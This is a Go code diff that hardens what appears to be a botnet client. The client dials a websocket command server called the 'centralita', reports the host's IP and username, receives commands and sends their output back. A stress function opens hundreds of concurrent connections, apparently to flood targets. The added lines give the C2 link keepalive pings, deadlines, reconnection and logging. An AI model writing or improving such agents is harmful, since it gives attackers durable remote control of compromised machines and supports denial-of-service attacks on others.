@@ -28,6 +28,14 @@ var (
 	concurrencia = 300
 )
 
+
+// cosas de websocket
+const (
+	writeWait  = 10 * time.Second
+	pongWait   = 60 * time.Second
+	pingPeriod = (pongWait * 9) / 10
+)
+
 func StressConnections(ctx context.Context, url string, concurrency int) {
 	tr := &http.Transport{
 		MaxIdleConns:        concurrency * 4,
@@ -93,9 +101,17 @@ func main() {
 	for {
 		conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
 		if err != nil {
+			fmt.Printf("dial error (%s): %v\n", wsURL, err)
 			time.Sleep(10 * time.Second)
 			continue
 		}
+
+		remote := conn.RemoteAddr().String()
+		conn.SetReadLimit(1024 * 1024)
+		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+		conn.SetPongHandler(func(string) error {
+			return conn.SetReadDeadline(time.Now().Add(pongWait))
+		})
 
 		info := ClientInfo{
 			IP: getLocalIP(),
@@ -103,15 +119,43 @@ func main() {
 			MAC:      "00:11:22:33:44:55",
 			Username: os.Getenv("USER"),
 		}
-		conn.WriteJSON(info)
+		_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
+		if err := conn.WriteJSON(info); err != nil {
+			fmt.Printf("hello write error (%s): %v\n", remote, err)
+			conn.Close()
+			time.Sleep(3 * time.Second)
+			continue
+		}
+
+		fmt.Printf("connected to centralita: %s as user=%q ip=%q\n", remote, info.Username, info.IP)
+
+		done := make(chan struct{})
+		go func() {
+			ticker := time.NewTicker(pingPeriod)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-done:
+					return
+				case <-ticker.C:
+					_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
+					if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+						fmt.Printf("ping error (%s): %v\n", remote, err)
+						return
+					}
+				}
+			}
+		}()
 
 		for {
 			var msg map[string]string
 			if err := conn.ReadJSON(&msg); err != nil {
+				fmt.Printf("read error (%s): %v\n", remote, err)
 				if cancelFunc != nil {
 					cancelFunc()
 				}
 				conn.Close()
+				close(done)
 				break
 			}
 
@@ -150,6 +194,7 @@ func main() {
 					"payload": output,
 				}
 
+				_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
 				if err := conn.WriteJSON(response); err != nil {
 					fmt.Println("error de envío:", err)
 				}
